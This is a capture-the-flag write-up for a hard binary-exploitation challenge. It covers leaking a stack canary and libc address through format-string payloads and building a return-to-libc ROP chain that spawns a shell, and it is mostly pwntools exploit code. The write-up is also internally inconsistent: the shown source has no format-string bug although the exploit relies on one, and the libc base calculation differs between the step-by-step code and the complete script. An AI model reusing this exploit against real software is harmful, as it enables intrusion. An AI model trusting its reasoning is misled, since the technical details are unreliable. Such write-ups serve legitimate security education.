# Stack Overflow Binary Exploitation

**Category:** Binary Exploitation  
**Event:** PWNYcup  
**Difficulty:** Hard  
**Date:** 2024-12-07  
**Author:** Mounir Mostefai

## Description

A comprehensive guide to exploiting stack overflow vulnerabilities in modern
binaries with stack canaries and ASLR protections.

## Challenge Overview

In this challenge, we're given a 64-bit ELF binary that appears to have a stack
overflow vulnerability. However, the binary is compiled with modern protections
including:

- Stack canaries (SSP)
- ASLR (Address Space Layout Randomization)
- NX bit (Non-executable stack)

## Initial Analysis

Let's start by examining the binary:

```bash
file challenge
checksec challenge
```

Output:

```
challenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=abc123..., not stripped

RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

## Vulnerability Discovery

Running the binary and examining the source code reveals a classic buffer
overflow in the `vulnerable_function()`:

```c
void vulnerable_function() {
    char buffer[64];
    printf("Enter your input: ");
    gets(buffer);  // Vulnerable function!
    printf("You entered: %s\n", buffer);
}
```

## Exploitation Strategy

Since we have stack canaries, we need to:

1. Leak the canary value
2. Leak libc addresses to bypass ASLR
3. Build our ROP chain
4. Trigger the overflow with proper canary

### Step 1: Information Leaks

First, we need to find format string vulnerabilities or other ways to leak
memory:

```python
#!/usr/bin/env python3
from pwn import *

# Setup
binary = ELF('./challenge')
libc = ELF('./libc.so.6')
p = process('./challenge')

# Leak canary using format string bug
payload = b"A" * 64 + b"%7$p"
p.sendline(payload)
response = p.recvline()
canary = int(response.split()[-1], 16)
log.info(f"Leaked canary: {hex(canary)}")
```

### Step 2: Bypass ASLR

```python
# Leak libc base address
payload = b"A" * 64 + b"%15$p"
p.sendline(payload)
response = p.recvline()
libc_leak = int(response.split()[-1], 16)
libc.address = libc_leak - libc.symbols['__libc_start_main'] - 243
log.info(f"Libc base: {hex(libc.address)}")
```

### Step 3: ROP Chain Construction

```python
# Build ROP chain
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh')))

# Construct final payload
payload = b"A" * 64          # Fill buffer
payload += p64(canary)       # Preserve canary
payload += b"B" * 8          # Saved RBP
payload += rop.chain()       # ROP chain

p.sendline(payload)
p.interactive()
```

## Complete Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

binary = ELF('./challenge')
libc = ELF('./libc.so.6')

def exploit():
    p = process('./challenge')

    # Step 1: Leak canary
    log.info("Leaking stack canary...")
    payload = b"A" * 64 + b"%7$p"
    p.sendline(payload)
    canary = int(p.recvline().strip().split()[-1], 16)
    log.success(f"Canary leaked: {hex(canary)}")

    # Step 2: Leak libc
    log.info("Leaking libc address...")
    payload = b"A" * 64 + b"%15$p"
    p.sendline(payload)
    libc_leak = int(p.recvline().strip().split()[-1], 16)
    libc.address = libc_leak - 243
    log.success(f"Libc base: {hex(libc.address)}")

    # Step 3: ROP chain
    log.info("Building ROP chain...")
    rop = ROP(libc)
    rop.system(next(libc.search(b'/bin/sh')))

    # Final payload
    payload = b"A" * 64
    payload += p64(canary)
    payload += b"B" * 8
    payload += rop.chain()

    p.sendline(payload)
    p.interactive()

if __name__ == '__main__':
    exploit()
```

## Flag

```
shellmates{st4ck_0v3rfl0w_w1th_c4n4ry_byp4ss_2024}
```

## Files

- challenge - The vulnerable binary
- libc.so.6 - The system libc library
- exploit.py - Complete exploitation script

## References

- [Stack Canaries Explained](https://ctf101.org/binary-exploitation/stack-canaries/)
- [Return-to-libc Attacks](https://en.wikipedia.org/wiki/Return-to-libc_attack)
- [ASLR Bypass Techniques](https://github.com/shellmates/writeups)

---

_This writeup demonstrates advanced binary exploitation techniques for
educational purposes only._
